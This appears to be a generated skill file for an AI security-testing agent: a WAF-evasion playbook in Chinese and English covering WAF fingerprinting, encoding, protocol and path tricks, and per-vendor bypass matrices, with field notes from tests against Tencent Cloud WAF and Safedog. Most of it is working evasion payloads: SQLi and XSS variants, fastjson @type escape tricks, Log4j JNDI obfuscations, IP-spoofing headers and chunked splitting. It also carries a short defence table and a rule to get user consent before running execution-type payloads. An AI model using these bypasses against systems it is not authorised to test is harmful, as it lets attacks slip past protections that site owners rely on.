---
name: "waf-bypass"
description: "waf-bypass"
---

> **ravenholt 环境版**：本文件由 `scripts/vendor_src_hunt.py` 按 `profiles/ravenholt.yaml` 生成。
> 技能一律用 `load_skill("src_hunt/<name>")` 按名加载，正文里的旧文件路径只作索引；
> `01`～`10` 指 `src_hunt/0X-*`。旧环境路径/工具名已替换；正文点名的脚本在沙箱里不存在时，改用等价工具，不要停工。

# waf-bypass

# WAF Bypass Techniques — Evasion Playbook

> **本模块管「payload 怎么变形」+ 厂商弱点矩阵。**
> **请求结构怎么变形**（不改 payload 一个字就让 WAF 看漏）走
> **`waf-bypass-parser-layer.md`** —— 含 WAFFLED 24 类解析器不一致、SPCA（HTTP/2 流混淆）、
> payload padding 体积绕过（AWS/Cloud Armor 默认只查 8KB）、对抗性 payload 生成、wafrift 工具链，
> 以及**静态 WAF 与动态 JS 防护（瑞数类）的关键区分**。
> 进站遇拦截建议顺序：**先查 `waf-bypass-parser-layer.md` §8 决策树**，再回本模块 §2 做 payload 变形。



## 1. PHASE 0 — IDENTIFY THE WAF

Before bypassing, know what you're fighting.

### 1.1 Tools

| Tool | Usage |
|---|---|
| `wafw00f target.com` | Fingerprint WAF vendor from response headers/behavior |
| `nmap --script=http-waf-detect` | NSE script for WAF detection |
| Manual header inspection | `Server`, `X-CDN`, `X-Cache`, `cf-ray` (Cloudflare), `x-sucuri-id`, `x-akamai-*` |

### 1.2 Behavioral Fingerprinting

```
1. Send benign request → record baseline response (status, headers, body size)
2. Send obvious attack: /?q=<script>alert(1)</script>
3. Compare: 403? Custom block page? Redirect? Connection reset?
4. Block page content reveals WAF: "Cloudflare", "Access Denied (Imperva)", "ModSecurity"
5. If transparent proxy: check response time difference (WAF adds latency)
```

---

## 2. GENERIC BYPASS CATEGORIES

> ★★ **动手前先做第 0 步：刻画规则形态。** 别一上来盲试编码变形 —— 先跑一组**正交位置矩阵**
> （把同一个字符串放到**值位置 / 键位置 / 单双引号 / 无引号 / 注释后 / 大小写 / `\u` 转义 / multipart / query**），
> 按「通过 / 拦截」反推出规则的真实形态。**成本极低、信息量最大**，
> 而且能立刻告出"哪类手法有意义、哪类白试"。方法、12 组对照表与亲例（反推出 `["']@type["']\s*:` + 两处缺口）
> 见 `recon-methodology.md` **§21**。
>
> ⚠️ **两个必配动作**：① 矩阵**首尾各发一次基线**（防"WAF 刚好关了"的误判）；
> ② 每次"通过"都要再判**应用侧认不认这个写法** —— **绕过了 WAF ≠ 打通了**，
> 判据必须「WAF 放行 **且** 应用按预期解释」两条同时成立（见 §2.1b 与 `recon-methodology.md` §22.3）。

### 2.1 Encoding Bypasses

| Technique | Example | Bypasses |
|---|---|---|
| URL encoding | `%3Cscript%3E` | Basic string matching |
| Double URL encoding | `%253Cscript%253E` | WAFs that decode once, app decodes twice |
| Unicode encoding | `%u003Cscript%u003E` | IIS-specific Unicode normalization |
| HTML entities | `&#60;script&#62;` or `&#x3c;script&#x3e;` | WAFs not performing HTML entity decoding |
| Hex encoding (SQL) | `0x756E696F6E` = `union` | WAFs matching SQL keywords |
| Octal encoding | `\74script\76` | Rare but some parsers handle it |
| Overlong UTF-8 | `%C0%BC` (invalid encoding for `<`) | Legacy parsers with loose UTF-8 handling |
| Mixed case | `SeLeCt`, `uNiOn` | Case-sensitive rule matching |
| Null byte | `sel%00ect` | WAFs that stop parsing at null |

### 2.1b ★★★ 框架「宽容解码」> WAF「严格解码」（最容易整类漏掉的一类）

**触发条件**：WAF **会**解标准转义（`\u0040`、`\x40` 都被拦）——**这绝不代表无解**。
去查**后端解析器自己的解码实现**：凡解析器比 WAF 宽容之处，就是绕过点。**差异在解码器的「严格程度」，不在「解不解码」。**

| 后端 | 宽容点（源码级） | 可用变体 |
|---|---|---|
| **fastjson**（`\x`） | 解码走 `digits[]` 查表，**未占位下标默认 0** ⇒ 第二字符可任意非 hex | `"@type"` → **`"\x4Jtype"`** / **`"\x4_type"`** |
| **fastjson**（`\u`） | 用 `Character.digit(c,16)`，**认非 ASCII 数字** | **`"\u００４０type"`**（全角）/ **`"\u๐๐๔๐type"`**（泰文） |
| 其它 JSON 库解析差异 | 见 `waf-bypass-parser-layer.md` §2.4 | — |

**实测记录（腾讯云 WAF，2026-09-19，探针用不存在的类名）**：

| 键的写法 | WAF | 应用回显 |
|---|---|---|
| `"@type"` / `"\x40\x74\x79\x70\x65"` / `"\u0040\u0074…"`（标准写法） | **拦 501** | — |
| **`"\x4Jtype"` / `"\x4_type"` / `"\u００４０type"` / `"\u๐๐๔๐type"`** | **✅ 通过** | `autoType is not support. <类名>` ⇒ **fastjson 真的消费了 `@type`** |

⇒ ⚠️ **公开资料的"混合编码 `\x40\u0074\u0079\u0070\u0065`"对该厂商单独用无效**（实测拦 501）。
**公开口诀式手法必须对本厂商实测**——但它提示的"去看解码器实现"这个方向是对的。

**通用化（任何框架特征字面量被拦都套这个）**：`@type`/`$ref`（fastjson）· OGNL / SpEL ·
`ac ed 00 05`（Java 原生序列化）· `O:N:"…"`（PHP）……
**先读后端解析器源码，找它的宽容点，再构造 WAF 认不出的等价写法。**

**判「autotype 开没开」的正确探针（⚠️ 2026-09-19 修正）**：
⛔ 别拿**不存在的类名**当探针 —— fastjson 对加载不到的类固定抛 `autoType is not support.`，**与开关无关**。
✅ 三类都要用：**`java.util.Locale`/`java.math.BigDecimal`**（存在、无无参构造、非 gadget）
→ `create instance error` = **通过检查（放行态）**；**`java.lang.Thread`**（黑名单成员，用**空对象**不给 `target`）
→ `autoType is not support.` = **黑名单在生效**；`java.lang.Class` + `val:"java.lang.String"` → `can not cast to JSONObject.`
= `@type=Class` 分支被执行。
**⛔ 探针阶段绝不用真 gadget 类名**（投递可利用载荷）。
★ **确要走这一步属「执行型载荷」** ⇒ 按 `SKILL.md §2` 第 9 条档②：**先向用户详细说明后果
（投什么载荷 / 目标上会发生什么 / 副作用与影响面 / 中止与善后），取得明确同意后执行**；未获同意不做。
完整案例、判读矩阵与处置纪律见 `recon-methodology.md` §23（基础）+ **§24（autotype 判定的正确方法，优先读）**。

### 2.2 Chunked Transfer Encoding

Split the payload across HTTP chunks so no single chunk contains the blocked pattern:

```http
POST /search HTTP/1.1
Transfer-Encoding: chunked

3
sel
3
ect
1
 
4
from
0

```

WAFs that inspect the full body may not reassemble chunks before matching.

### 2.3 HTTP/2 Binary Format Bypasses

HTTP/2 transmits headers as binary HPACK-encoded frames. Some WAFs only inspect after downgrading to HTTP/1.1:

- Header names can contain characters illegal in HTTP/1.1
- Pseudo-headers (`:method`, `:path`) bypass header-based WAF rules
- H2 → H1 downgrade may introduce request smuggling (see [request-smuggling](http-smuggling-test.md))

### 2.4 HTTP Parameter Pollution (HPP)

Different servers handle duplicate parameters differently:

| Server | Behavior for `?a=1&a=2` |
|---|---|
| PHP/Apache | Last value: `a=2` |
| ASP.NET/IIS | Concatenated: `a=1,2` |
| Python/Flask | First value: `a=1` |
| Node.js/Express | Array: `a=[1,2]` |

WAF checks `a=1` (benign), app uses `a=2` (malicious). Or combine: `a=sel&a=ect` → ASP.NET sees `a=sel,ect`.

### 2.5 IP Source Spoofing (Bypass IP-Based Rules)

Headers trusted by some WAFs/apps for client IP:

```
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
Forwarded: for=127.0.0.1
```

Use case: WAF whitelists internal IPs or has different rule sets per source.

### 2.6 Path Normalization Tricks

| Technique | Example | Effect |
|---|---|---|
| Dot segments | `/./admin` or `/../target/admin` | WAF sees different path than app |
| Double slash | `//admin` | Some normalizers collapse, WAFs may not |
| URL encoding path | `/%61dmin` | WAF sees encoded, app decodes |
| Null byte in path | `/admin%00.jpg` | Legacy: app truncates at null, WAF sees .jpg |
| Backslash (IIS) | `/admin\..\/secret` | IIS treats `\` as `/` |
| Trailing dot/space | `/admin.` or `/admin%20` | OS-level normalization (Windows) |
| Semicolon (Tomcat) | `/admin;jsessionid=x` | Tomcat strips after `;`, WAF may not |

### 2.7 Content-Type Manipulation

WAFs often have format-specific parsers. Switching Content-Type can bypass rules:

```
Default:  Content-Type: application/x-www-form-urlencoded  → WAF parses params
Switch:   Content-Type: application/json  → WAF may not parse JSON body
Switch:   Content-Type: multipart/form-data  → WAF may not inspect all parts
Switch:   Content-Type: text/xml  → WAF expects XML, payload in different format
```

**Trick**: If app accepts both JSON and form-urlencoded, use JSON — WAFs often have weaker JSON inspection rules.

### 2.8 Multipart Boundary Abuse

```http
Content-Type: multipart/form-data; boundary=----WAFBypass

------WAFBypass
Content-Disposition: form-data; name="q"

<script>alert(1)</script>
------WAFBypass--
```

Variations: long boundary strings, boundary with special characters, missing final boundary, nested multipart.

### 2.9 Newline & Whitespace Injection

```sql
-- SQL keyword splitting
SEL
ECT * FROM users

-- SQL comment insertion
SEL/**/ECT * FR/**/OM users
UN/**/ION SEL/**/ECT 1,2,3

-- Tab/vertical tab as separator
SELECT\t*\tFROM\tusers
```

### 2.10 Keyword Splitting & Alternative Syntax

| Blocked | Alternative |
|---|---|
| `UNION SELECT` | `UNION ALL SELECT`, `UNION DISTINCT SELECT` |
| `OR 1=1` | `OR 2>1`, `OR 'a'='a'`, `||1` |
| `<script>` | `<svg/onload=alert(1)>`, `<img src=x onerror=alert(1)>` |
| `alert(1)` | `prompt(1)`, `confirm(1)`, `print()` (Chrome) |
| `eval()` | `Function('code')()`, `setTimeout('code',0)` |
| `' OR '1'='1` | `' OR 1-- -`, `'\|\|'1` |
| `SLEEP(5)` | `BENCHMARK(5000000,SHA1('x'))`, `pg_sleep(5)` |

---

## 3. PROTOCOL-LEVEL BYPASS TECHNIQUES

### 3.1 Request Line Abuse

```http
GET /path?q=attack HTTP/1.1    ← WAF inspects
```

vs.

```http
GET http://target.com/path?q=attack HTTP/1.1   ← Absolute URI: some WAFs miss the path
```

### 3.2 Header Injection via CRLF

If WAF inspects original headers but app processes injected ones:

```
X-Custom: value\r\nX-Forwarded-For: 127.0.0.1
```

### 3.3 Connection-State Bypass

```
1. Establish connection through WAF (normal request)
2. On same keep-alive connection, send attack request
3. Some WAFs reduce inspection on subsequent requests in same connection
```

---

## 4. WAF BYPASS DECISION TREE

```
Payload blocked by WAF?
├── Identify WAF (wafw00f, response headers, block page)
│
├── Try encoding bypasses
│   ├── URL encode payload → still blocked?
│   ├── Double URL encode → still blocked?
│   ├── Unicode/overlong UTF-8 → still blocked?
│   ├── Mixed case keywords → still blocked?
│   ├── HTML entities (for XSS) → still blocked?
│   └── ★★★ 拦的是「框架特征字面量」（`@type`/`$ref`/OGNL/SpEL/`ac ed 00 05`）？
│         → **别停在编码层就判无解**。去读**后端解析器自己的解码实现**，
│           找「它比 WAF 宽容」的点（见 §2.1b）。亲例：
│           fastjson `"@type"` → `"\x4Jtype"`（digits 表未占位即 0）/ `"\u００４０type"`（认全角数字）
│           ⇒ 标准 `\x40`/`\u0040` 被拦 **≠** 无解
│
├── Try protocol-level bypasses
│   ├── Switch Content-Type (JSON, multipart, XML)
│   │   └── App accepts alternate format? → re-send payload
│   ├── HTTP Parameter Pollution (duplicate params)
│   ├── Chunked Transfer-Encoding to split payload
│   ├── HTTP/2 direct if available (binary framing bypass)
│   └── Request line: absolute URI format
│
├── Try path-based bypasses
│   ├── Path normalization (/./path, //path, ;param)
│   ├── Different HTTP method (POST vs PUT vs PATCH)
│   └── Alternate endpoint serving same function
│
├── Try payload mutation
│   ├── SQL: comments (/**/), alternative functions, hex literals
│   ├── XSS: alternative tags/events, JS template literals
│   ├── RCE: wildcard abuse, string concatenation, variable expansion
│   └── Check WAF_PRODUCT_MATRIX.md for vendor-specific mutations
│
├── Try IP-source bypass
│   ├── X-Forwarded-For / True-Client-IP spoofing
│   ├── Access origin server directly (bypass CDN)
│   └── Find origin IP (Shodan, historical DNS, email headers)
│
└── Try request smuggling to skip WAF entirely
    └── See http-smuggling-test.md
```

---

## 5. COMMON MISTAKES & TRICK NOTES

1. **Test bypass with actual exploitation, not just 200 OK**: WAF may return 200 but strip the payload silently.
2. **WAFs often have size limits**: Very large request bodies (>8KB–128KB depending on WAF) may bypass inspection entirely.
3. **Rate limiting ≠ WAF**: Getting 429s is rate limiting, not payload blocking. Different bypass needed.
4. **CDN caching**: If the WAF is at CDN level, cached responses bypass WAF on subsequent requests. Poison cache with clean request, exploit cache.
5. **Origin server direct access**: If you find the origin IP behind CDN/WAF, connect directly — WAF is bypassed completely.
6. **Multipart file upload fields**: WAFs often skip inspection of file content in multipart uploads — embed payload in filename or file content if reflected.

---

## 6. DEFENSE PERSPECTIVE

| Measure | Notes |
|---|---|
| WAF + application-level input validation | WAF is a layer, not a fix |
| Parameterized queries | Eliminates SQLi regardless of WAF |
| CSP + output encoding | Eliminates XSS regardless of WAF |
| Regularly update WAF rules | Vendor signatures lag behind new bypasses |
| Deny by default, not block-list | Allowlist valid input patterns |
| Log and alert on WAF blocks | Bypass attempts are visible in logs |


---


## 附件：WAF_PRODUCT_MATRIX

# WAF Product Bypass Matrix


## 1. Cloudflare WAF

### Detection

- `cf-ray` header, `Server: cloudflare`, block page references "Cloudflare"
- Cookie: `__cfduid`, `__cf_bm`

### Known Bypass Techniques

| Category | Technique |
|---|---|
| Unicode normalization | Cloudflare normalizes Unicode differently than backend — `＜script＞` (fullwidth) may pass WAF but render as `<script>` |
| Chunked body | Split payloads across HTTP chunks; Cloudflare may not reassemble before inspection |
| Payload mutation (SQLi) | `/*!50000UniOn*/SeLeCt` — MySQL version comments bypass keyword matching |
| Payload mutation (XSS) | `<svg/onload=alert&#40;1&#41;>`, `<details open ontoggle=alert(1)>` |
| Origin direct access | Find origin IP via DNS history, Shodan `ssl.cert.subject.cn:target.com`, email headers |
| JSON body | Switch from form-urlencoded to JSON — different parser, weaker rules |
| Super-long parameter names | Parameter name >128 chars may cause Cloudflare to skip inspection |

### Cloudflare-Specific Notes

- Cloudflare has multiple WAF modes: "Managed Rules" (Cloudflare-authored) and "OWASP ModSecurity Core Rule Set". Each has different bypass surfaces.
- Cloudflare's free-tier WAF has significantly fewer rules than Business/Enterprise.
- Browser Integrity Check and Bot Management are separate from WAF — don't confuse them.

---

## 2. AWS WAF

### Detection

- `x-amzn-requestid` header, runs in front of ALB/CloudFront/API Gateway
- Block response often returns 403 with JSON body or custom error page

### Known Bypass Techniques

| Category | Technique |
|---|---|
| Regex complexity | AWS WAF regex rules have execution time limits — complex input can cause regex to timeout → request passes |
| Size limits | AWS WAF inspects first 8KB of body (16KB for CloudFront). Payload after this boundary is uninspected |
| Custom rule gaps | Default AWS Managed Rules miss many edge cases; custom rules often have logic errors |
| JSON depth | Deeply nested JSON objects may exceed parser depth limits |
| Base64 in parameters | AWS WAF doesn't auto-decode Base64 in parameter values (unless custom transform configured) |
| URI vs body rules | Rules may cover URI but not body, or vice versa — test both |

### AWS WAF-Specific Notes

- AWS WAF v2 (WAFV2) has `SizeConstraintStatement` — bodies over the size limit are either blocked or allowed, depending on config. If "allow on oversize", pad payload beyond 8KB.
- AWS Managed Rule Groups update regularly but lag behind novel attack patterns.
- IP reputation lists may be stale — new IPs from cloud providers often aren't listed.

---

## 3. ModSecurity + OWASP CRS

### Detection

- `Server: Apache` or `nginx` with ModSecurity module
- Block page: "ModSecurity" reference, or generic 403
- Error contains rule ID (e.g., `id:942100`)

### Known Bypass Techniques

| Category | Technique |
|---|---|
| Paranoia Level (PL) gaps | PL1 (default) has minimal rules; PL2-4 progressively stricter. Most deployments run PL1-2, missing many attack patterns |
| Rule ID specific bypass | Each rule targets specific patterns — identify blocking rule ID from error, craft bypass for that specific regex |
| SQL comment injection | `/*! ... */` MySQL conditional comments bypass many CRS SQLi rules |
| Unicode in PL1 | PL1 doesn't check Unicode-encoded payloads: `%u0027` for `'` |
| Transformation order | CRS applies `t:urlDecodeUni,t:htmlEntityDecode` but not all transformations on all rules |
| Multipart parser | CRS multipart parsing can be confused by malformed boundaries |
| Request body limit | `SecRequestBodyLimit` default is 13MB — but `SecRequestBodyNoFilesLimit` is only 128KB (changeable). Payloads in file upload fields bypass body rules if only `NoFiles` limit is enforced |

### CRS-Specific Notes

- CRS v4 (2023+) significantly improved coverage vs v3. Check target's CRS version.
- Anomaly scoring mode: individual rule violations add to score, blocked only if total exceeds threshold. Keep individual violations below detection but accumulate effect.
- `SecRuleRemoveById` directives in config may disable specific rules — test for holes.

---

## 4. Akamai (Kona Site Defender / App & API Protector)

### Detection

- `Server: AkamaiGHost`, `x-akamai-*` headers
- Error reference number in block page

### Known Bypass Techniques

| Category | Technique |
|---|---|
| Header injection | Akamai processes certain headers differently; `X-Forwarded-Host` injection can confuse routing |
| Encoding chains | Triple encoding or mixed encoding (URL + Unicode + HTML) |
| JSON body bypass | Akamai's JSON parser may not inspect deeply nested objects |
| Slow POST | Akamai has timeout-based protections; slow delivery may cause incomplete inspection |
| HTTP/2 push | H2 server push responses may bypass WAF inspection |
| IP rotation | Akamai rate limits per IP; rotating source IPs avoids behavioral blocks |

### Akamai-Specific Notes

- Akamai has "Adaptive Security Engine" — it learns application behavior. New attack patterns that don't match learned behavior may bypass initially.
- Penalty box: after triggering Akamai WAF, your IP may be rate-limited for minutes. Use fresh IP for each test.
- Akamai Pragma headers (`Pragma: akamai-x-check-cacheable`) can leak internal routing information useful for understanding the setup.

---

## 5. Imperva / Incapsula

### Detection

- `X-CDN: Imperva`, `Set-Cookie: incap_ses_*`, `visid_incap_*`
- Block page: "Powered by Incapsula" or Imperva branding

### Known Bypass Techniques

| Category | Technique |
|---|---|
| Parameter pollution | Duplicate parameters: Imperva inspects one occurrence, app processes another |
| JSON deep nesting | `{"a":{"b":{"c":{"d":"payload"}}}}` — deeply nested JSON exceeds parser depth |
| Multipart abuse | Malformed multipart boundaries confuse Imperva's parser |
| UTF-8 BOM injection | `\xEF\xBB\xBF` at start of body may shift parser alignment |
| Large Cookie header | Extremely long Cookie headers may cause truncated inspection |
| WebSocket upgrade | After WebSocket upgrade, subsequent traffic may bypass WAF inspection |

### Imperva-Specific Notes

- Imperva has "Client Classification" — browser fingerprinting. Headless browsers may be blocked before WAF rules even apply. Use real browser fingerprints.
- Imperva's API security module is separate from web WAF — API endpoints may have weaker protection.
- Custom rules in Imperva use "IncapRule" syntax — misconfigurations are common.

---

## 6. F5 BIG-IP ASM / Advanced WAF

### Detection

- `Server: BigIP`, `BIGipServer` cookie, `TS` cookie prefix
- Block page: "The requested URL was rejected" with support ID

### Known Bypass Techniques

| Category | Technique |
|---|---|
| Serialized format bypass | ASM has weak inspection of serialized data (Java, PHP, .NET serialization) |
| JSON/XML content switching | Switch between JSON and XML — ASM may have different rule sets per content type |
| Parameter meta-characters | ASM's "meta-character enforcement" can be bypassed with double encoding |
| Cookie manipulation | ASM sets tracking cookies; modifying them can cause session tracking issues that affect rule application |
| Evasion techniques | ASM has explicit "evasion detection" for directory traversal, multiple encoding, etc. But combinations of techniques may still bypass |
| Learning mode exploitation | If ASM is in "transparent" (learning) mode, no blocking occurs — test with obviously malicious payload first |

### F5-Specific Notes

- BIG-IP ASM distinguishes between "attack signatures" and "violations". Signatures are pattern-based; violations are structural (parameter length, data type). Both must be bypassed.
- ASM's "Bot Defense" module is separate and can be detected via JavaScript challenge injection.
- The `TS` cookie contains session data — tampering with it causes ASM to treat the request as a new session.

---

## 7. Sucuri WAF

### Detection

- `Server: Sucuri/Cloudproxy`, `X-Sucuri-ID` header
- Block page: "Access Denied - Sucuri Website Firewall"

### Known Bypass Techniques

| Category | Technique |
|---|---|
| Tag/event combos | Sucuri blocks common XSS tags but may miss: `<svg/onload>`, `<details/ontoggle>`, `<marquee onstart>` |
| SQL function alternatives | `MID()` instead of `SUBSTRING()`, `CONV()` for hex conversion |
| Path traversal encoding | `..%252f..%252f` (double URL encode) for directory traversal |
| Origin direct access | Sucuri is a reverse proxy; origin IP discovery bypasses it entirely |
| HTTP method switch | Sucuri may have different rules for GET vs POST vs PUT |
| Null byte injection | `%00` in parameter values may truncate Sucuri's inspection |

### Sucuri-Specific Notes

- Sucuri is common on WordPress sites — combine with WordPress-specific attack vectors.
- Sucuri's "Hardening" features (block PHP in uploads, etc.) are separate from WAF rules.
- Free Sucuri tier has significantly weaker WAF rules than paid tiers.

---

## 8. 腾讯云 WAF（qcloud / Tengine）—— 2026-09-19 实测

### Detection

- 拦截页 `Server: qcloud-txcloud*-nginx-proxy-*`（含 `Powered by Tengine`）
- 拦截页含 `<!-- event_id: xxxxxxxx -->`（★ 甲方可用它查日志溯源）+ **固定体积**（亲例 693B）
- 状态码常见 **501**（也有 403/412）；响应 `Content-Type: text/html` 且与业务响应**形态完全不同**
- ★ **别误判**：同一次会话先取一条**正常业务响应**做基线（亲例 `param={}` → 200/79B JSON），
  形态突变 = 被 WAF 拦，不是应用拒绝

### Known Bypass Techniques（实测）

| 类别 | 手法 | 结果 |
|---|---|---|
| **框架宽容解码（§2.1b）** | fastjson `"\x4Jtype"` / `"\x4_type"` / `"\u００４０type"` / `"\u๐๐๔๐type"` | ✅ **全部通过**（标准 `\x40`/`\u0040` 被拦） |
| 转义解码 | `\u0040…` / 全 `\u` / `\x40\x74…` | ❌ 拦 ⇒ **会解码标准 unicode 与 hex** |
| 控制字符填充 | `{"@type"\b:…}` / `"@type"\n:…` | ❌ 拦 ⇒ 规则**不是**简单的 `\s*` |
| 单引号 / 注释 | `{'@type':…}` / `{/*x*/"@type":…}` | ❌ 拦 |
| multipart + `CTE: base64` | — | ❌ 拦 |
| multipart + `CTE: quoted-printable` | — | ⚠️ 放行，但**应用整体丢弃带 CTE 的分段**（诊断：`CTE + param={}` 响应等同参数不存在）⇒ 无效 |
| HPP | `param=safe&param={"@type":…}` | ❌ 拦 ⇒ 检查**全部**同名参数 |
| query 承载 | `?param={"@type":…}` | ❌ 拦 ⇒ **也查 query string** |
| 分块传输拆分关键字 | `%40type` 拆两个 chunk | ❌ 拦 ⇒ **有分块重组** |
| 大小写 | `{"@TYPE":…}` | ✅ 穿过，但 **fastjson 的 autotype 键要求精确小写** ⇒ 目标行为不触发 |
| 无引号 | `{@type:…}` | ✅ 穿过，但**应用解析器报 `illegal identifier`** |
| 超大数据包 | 利用检测上限把 payload 推出检测窗口 | 未测（**资源消耗型，有 DoS 红线时不做**） |

### Key Weaknesses

- ★ **转义解码的严格程度与后端解析器不对齐** —— 这是本厂商最实质的缺口（见 §2.1b）。
  规则要求**字面量** `@type`，所以任何"字面不同、语义相同"且**后端认**的写法都能穿。
- **大小写敏感** ⇒ `@TYPE` 100% 穿过（但需后端也认大写才有用）
- **无引号形式** ⇒ 100% 穿过（同上，需后端认）
- ⚠️ 两处"穿过 WAF"的手法**都被应用侧堵死** ⇒ **不是防护有效，是巧合互补**。
  修复优先级：**服务端 > WAF**。
- **推测**（未验证）：规则匹配疑似**按 `\r` 切行** —— 明文 `{"@type"\r:…}` 通过了 WAF，
  而 `\b`/`\n` 版本被拦。若要利用需后端也接受该写法（亲例 fastjson 不接受 ⇒ 未成立）。

### 附带产出

- 拦截页泄漏的 **`event_id`** + **代理主机名**写进报告对甲方有价值（可查日志溯源）
- ⚠️ **`Origin` 头可能被另一层代理 403**（亲例：华为 `huawei-hw-nginx-proxy-35-*`）
  ⇒ **侦察期一律不带 Origin**，否则会把"代理拒"误判成"被限流"

---

## 9. QUICK REFERENCE — BYPASS-BY-WAF CHEAT SHEET

| WAF | Top Bypass Vector | Size Limit | Key Weakness |
|---|---|---|---|
| Cloudflare | Unicode normalization + origin IP | 128KB | Fullwidth chars, free tier gaps |
| AWS WAF | Body size > 8KB | 8KB (body) | Size limit bypass, regex timeout |
| ModSecurity CRS | PL1 gaps + MySQL comments | Configurable | Low paranoia defaults |
| Akamai | Encoding chains + slow POST | Varies | Adaptive engine learning delay |
| Imperva | HPP + JSON nesting | Unknown | Parameter pollution |
| F5 BIG-IP | Serialized data + learning mode | Configurable | Weak serialization inspection |
| Sucuri | Origin IP + alt tags | Unknown | WordPress-centric rules |
| **腾讯云 WAF** | ★ **框架宽容解码**（`\x4Jtype`/全角 `\u００４０`） | Unknown | **转义解码严格度与后端解析器不对齐**；规则大小写敏感；无引号形式 100% 穿过 |

---

## 10. 安全狗（Safedog）—— 2026-10-03 实测

### Detection
- 拦截页 **`<title>网站防火墙</title>`** + 文案「您的请求带有不合法参数，已被网站管理员设置拦截！」
- ★ **响应体尾部注释带版本与日期**：`<!--9.8.4 2025-12-08  -->` ⇒ **可精确取到 WAF 版本**（首见即记）。

### 实测规则特征：字面关键词匹配，非语义解析

逐级载荷测绘（占位域 `x`，零副作用）：

| 载荷 | 结果 |
|---|---|
| `${jndi:dns://x}` | 拦 |
| **`ldap://x`（裸串）** | **拦** |
| `${${…}}`（嵌套 `${${`） | 拦 |
| `jndi:dns://x`（**无** `${`） | **过** |
| `${}` / `${x}` | **过** |
| **`${lower:l}dap://x`** | **过** |
| **`${::-l}dap://x`** | **过** |
| **`${lower:j}ndi:${lower:l}dap://x`** | **过** |

⇒ **只匹配字面 `ldap://` 与 `${jndi:` 的组合** ⇒ 用 Log4j 自身的 `${lower:x}` 展开语法
**包住关键词中任一字母即可绕过**。

★★ **通用推论**：凡「字面关键词型」WAF（安全狗、多数国产 WAF），其**同类规则**
（`file://`、`../`、`select `…）**大概率同理可绕** ⇒ **WAF 不能作为唯一防线**。

### ★★ 由此派生：被 WAF 拦掉的路径，必须回应用层判存在性

亲例：`/evo-apigw/evo-arsm/1.0.0/ars/list` → **403（WAF 单点拦）**；
而**同前缀的 `/zzz`、`/`、父路径** → **200 `100011 Token Check error`**。
- 若只看 `ars/list` 的 403 ⇒ 会误判成「路径不存在」或「无法验证」；
- 继续测同前缀 ⇒ 看到**网关 Token 校验**这层真实闸门 ⇒ 结论是「**WAF 掩护 + 网关兜底 ⇒ 不可利用**」。

⇒ **规则**：WAF 403 只代表「**没到应用**」，**既不能写存在、也不能写不存在**，
必须换路径 / 换形态重测；且「WAF 有精确单点规则」可作**该漏洞曾被关注**的旁证，但不能替代验证。
